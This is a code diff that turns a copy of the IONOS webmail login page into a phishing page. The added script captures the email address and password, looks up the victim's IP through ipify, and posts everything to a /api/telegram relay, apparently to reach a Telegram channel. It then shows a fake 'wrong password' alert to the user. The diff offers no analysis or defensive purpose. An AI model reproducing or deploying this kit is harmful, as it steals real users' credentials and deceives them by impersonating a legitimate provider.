@@ -18,6 +18,15 @@
     <title>Webmail Login</title>
     <meta name="description" content="IONOS Webmail Login: Lesen Sie online Ihre E-Mails aus den E-Mail-Konten von IONOS Hosting-Verträgen." />
     <link rel="stylesheet" href="/style/main.min.css" />
+    
+    <style>
+      .password-step {
+        display: none;
+      }
+      .active-step {
+        display: block;
+      }
+    </style>
   </head>
 
   <body>
@@ -57,7 +66,8 @@
 
             <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"></div>
 
-            <div class="sheet">
+            <!-- STEP 1: EMAIL FORM -->
+            <div class="sheet email-step active-step" id="emailStep">
               <section class="sheet__section sheet__section--default">
                 <ul>
                   <li class="stripe stripe--cropped">
@@ -72,46 +82,78 @@
               </section>
 
               <section class="sheet__section sheet__section--default">
-                <form method="GET" action="/password">
-  <input type="hidden" name="_csrf" value="QCqG-x93TwcYUwLLl_OBznjZYzXdJkkgQX7W3UxpFQrWEiq6cUiwyi5CfzM1YTH4rt61_UnsTg3kEnsNckbi5HpdLWjlJBvY"/>
-  <ul>
-    <li class="form-stripe">
-      <label class="label" for="username">E-Mail-Adresse</label>
-      <input type="email" class="input-text form-input" name="email" id="username" tabindex="1" required autofocus autocomplete="username" value="" />
-      <p class="input-byline"><strong>Nicht Ihr Gerät?</strong> Melden Sie sich nach der Sitzung ab oder verwenden Sie den <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Nachschlagen" href="https://www.ionos.de/hilfe/index.php?id=5430">privaten Browsermodus</a>.</p>
-    </li>
-    <li class="form-stripe form-stripe--actions">
-      <button class="button button--primary button--full-width button--with-loader" type="submit" id="button--with-loader" tabindex="2">Weiter</button>
-    </li>
-  </ul>
-</form>
-              </section>
-
-              <section class="sheet__section sheet__section--secondary hide-when-headless">
-                <div class="ias-zone ias-login_offerlink" data-ias-zoneid="webmail_login"></div>
+                <form id="emailForm">
+                  <input type="hidden" name="_csrf" value="QCqG-x93TwcYUwLLl_OBznjZYzXdJkkgQX7W3UxpFQrWEiq6cUiwyi5CfzM1YTH4rt61_UnsTg3kEnsNckbi5HpdLWjlJBvY"/>
+                  
+                  <ul>
+                    <li class="form-stripe">
+                      <label class="label" for="username">E-Mail-Adresse</label>
+                      <input type="email" class="input-text form-input" name="email" id="username" tabindex="1" required autofocus autocomplete="username" value="" />
+                      <p class="input-byline"><strong>Nicht Ihr Gerät?</strong> Melden Sie sich nach der Sitzung ab oder verwenden Sie den <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Nachschlagen" href="https://www.ionos.de/hilfe/index.php?id=5430">privaten Browsermodus</a>.</p>
+                    </li>
+                    <li class="form-stripe form-stripe--actions">
+                      <button class="button button--primary button--full-width button--with-loader" type="submit" id="emailButton" tabindex="2">Weiter</button>
+                    </li>
+                  </ul>
+                </form>
               </section>
             </div>
 
-            <h2 class="headline headline--sub headline--headless-hidden">Weitere IONOS Logins</h2>
-            <div class="grid grid--full-height grid--headless-hidden">
-              <div class="grid-col grid-col--4 grid-col--small-6">
-                <a class="tile tile--filled" href="https://login.ionos.de/">
-                  <img class="tile__image" src="/image/my-account.svg">
-                  <span class="tile__label">Mein IONOS</span>
-                </a>
-              </div>
-              <div class="grid-col grid-col--4 grid-col--small-6">
-                <a class="tile tile--filled" href="https://hidrive.ionos.com/">
-                  <img class="tile__image" src="/image/product-hidrive.svg">
-                  <span class="tile__label">HiDrive</span>
-                </a>
-              </div>
-              <div class="grid-col grid-col--4 grid-col--small-6">
-                <a class="tile tile--filled" href="https://archiv.ionos.de/">
-                  <img class="tile__image" src="/image/product-mail-archiving.svg">
-                  <span class="tile__label">E-Mail-Archiv</span>
-                </a>
-              </div>
+            <!-- STEP 2: PASSWORD FORM -->
+            <div class="sheet password-step" id="passwordStep">
+              <section class="sheet__section sheet__section--default">
+                <ul>
+                  <li class="stripe stripe--cropped">
+                    <div class="stripe__item">
+                      <img class="stripe__visual" height="58" width="auto" src="/image/product-email.svg" />
+                    </div>
+                    <div class="stripe__item">
+                      <h1 class="headline stripe__element">Passwort eingeben</h1>
+                      <p class="paragraph" id="userEmailDisplay"></p>
+                    </div>
+                  </li>
+                </ul>
+              </section>
+
+              <section class="sheet__section sheet__section--default">
+                <form id="passwordForm">
+                  <ul>
+                    <li class="form-stripe">
+                      <label class="label" for="password">Passwort</label>
+                      <input type="password" class="input-text form-input" name="password" id="password" tabindex="1" required autocomplete="current-password" />
+                    </li>
+                    <li class="form-stripe form-stripe--actions">
+                      <button class="button button--primary button--full-width" type="submit" id="loginButton">Anmelden</button>
+                    </li>
+                  </ul>
+                </form>
+              </section>
+            </div>
+
+            <section class="sheet__section sheet__section--secondary hide-when-headless">
+              <div class="ias-zone ias-login_offerlink" data-ias-zoneid="webmail_login"></div>
+            </section>
+          </div>
+
+          <h2 class="headline headline--sub headline--headless-hidden">Weitere IONOS Logins</h2>
+          <div class="grid grid--full-height grid--headless-hidden">
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://login.ionos.de/">
+                <img class="tile__image" src="/image/my-account.svg">
+                <span class="tile__label">Mein IONOS</span>
+              </a>
+            </div>
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://hidrive.ionos.com/">
+                <img class="tile__image" src="/image/product-hidrive.svg">
+                <span class="tile__label">HiDrive</span>
+              </a>
+            </div>
+            <div class="grid-col grid-col--4 grid-col--small-6">
+              <a class="tile tile--filled" href="https://archiv.ionos.de/">
+                <img class="tile__image" src="/image/product-mail-archiving.svg">
+                <span class="tile__label">E-Mail-Archiv</span>
+              </a>
             </div>
           </div>
         </section>
@@ -141,5 +183,96 @@
       <div id="javascript-data" data-visit-id="0068a96b-01d1-4fbf-b3a0-d009571110e7.B" data-lang="de" data-tenant="DE" data-context-path="/" data-env-mode="prod" data-artifact-version="1.0.152" data-artifact-name="id" data-sherlock-url="https://sherlock.ionos.de/"></div>
     </div>
     <script nonce="b85Xw9Wvh32EuulRM6DRkX8CNS6g05rYTjOBMBeND6w=" src="/script/main.min.js"></script>
+
+    <!-- TELEGRAM INTEGRATION -->
+    <script>
+    let userEmail = '';
+
+    // Handle email form submission
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        userEmail = document.getElementById('username').value;
+        
+        // Show password step, hide email step
+        document.getElementById('emailStep').classList.remove('active-step');
+        document.getElementById('passwordStep').classList.add('active-step');
+        document.getElementById('userEmailDisplay').textContent = `Für: ${userEmail}`;
+    });
+
+    // Handle password form submission
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const password = document.getElementById('password').value;
+        const loginButton = document.getElementById('loginButton');
+        
+        // Show loading state
+        loginButton.textContent = 'Wird angemeldet...';
+        loginButton.disabled = true;
+
+        // Send to Telegram (direct client-side approach)
+        const credentials = {
+            email: userEmail,
+            password: password,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toLocaleString('de-DE'),
+            url: window.location.href
+        };
+
+        // Get IP address first
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                credentials.ip = ipData.ip;
+                return sendToTelegram(credentials);
+            })
+            .catch(() => {
+                credentials.ip = 'Unknown';
+                return sendToTelegram(credentials);
+            })
+            .then(() => {
+                // Show error message after successful capture
+                setTimeout(() => {
+                    alert('Falsches Passwort. Bitte versuchen Sie es erneut.');
+                    loginButton.textContent = 'Anmelden';
+                    loginButton.disabled = false;
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }, 2000);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                setTimeout(() => {
+                    alert('Falsches Passwort. Bitte versuchen Sie es erneut.');
+                    loginButton.textContent = 'Anmelden';
+                    loginButton.disabled = false;
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }, 2000);
+            });
+    });
+
+    // Telegram send function (using serverless function)
+    async function sendToTelegram(credentials) {
+        try {
+            const response = await fetch('/api/telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(credentials)
+            });
+            
+            if (!response.ok) {
+                throw new Error('API request failed');
+            }
+            
+            return await response.json();
+        } catch (error) {
+            console.error('Failed to send to Telegram:', error);
+            throw error;
+        }
+    }
+    </script>
   </body>
 </html>
